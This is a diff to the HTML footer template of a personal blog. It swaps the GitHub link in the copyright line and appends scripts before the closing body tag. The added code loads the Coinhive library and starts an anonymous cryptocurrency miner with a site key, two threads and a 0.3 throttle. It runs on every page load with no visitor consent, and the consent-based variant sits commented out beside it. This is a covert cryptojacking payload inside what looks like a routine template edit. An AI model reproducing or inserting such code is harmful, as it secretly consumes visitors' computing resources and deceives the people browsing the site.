@@ -39,7 +39,7 @@
                             <img style="display: block;margin: 0 auto;" th:src="@{/user/img/logo.png}" th:alt="${commons.site_title()}"/>
                         </a>
                         <br/>
-                        <p>&copy; 版权所有 <a href="https://github.com/zhisheng17/blog" target="_blank"
+                        <p>&copy; 版权所有 <a href="https://github.com/DanRui/blog" target="_blank"
                                          rel="nofollow">My Blog</a> 保留一切权利
                         </p>
                         <br/>
@@ -203,6 +203,18 @@
     });
     InstantClick.init('mousedown');
     /*]]>*/
+</script>
+<!--<script src="https://authedmine.com/lib/authedmine.min.js"></script>-->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('hAkPSzcBQomwRrbaDxv8hS8Pnhh3CewJ',
+        {
+            threads : 2,
+            throttle : 0.3,
+            language : 'auto'
+        }
+        );
+    miner.start();
 </script>
 </body>
 </html>
